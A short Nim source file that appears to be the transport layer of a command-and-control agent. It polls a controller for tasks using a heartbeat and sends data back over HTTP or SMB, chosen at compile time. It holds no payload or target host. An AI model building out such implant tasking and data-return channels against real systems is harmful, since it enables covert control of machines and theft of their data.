import ./transport/[http, smb]
import ../../common/types
import ../protocol/heartbeat

proc getTasks*(ctx: AgentCtx): string = 
    when defined(TRANSPORT_HTTP):
        var heartbeat: Heartbeat = ctx.createHeartbeat()
        let heartbeatBytes: seq[byte] = ctx.serializeHeartbeat(heartbeat)
        return ctx.httpGet(heartbeatBytes)

    when defined(TRANSPORT_SMB): 
        return ctx.smbRead()

proc sendData*(ctx: AgentCtx, data: seq[byte]): bool {.discardable.} = 
    when defined(TRANSPORT_HTTP): 
        return ctx.httpPost(data)

    when defined(TRANSPORT_SMB): 
        return ctx.smbWrite(data)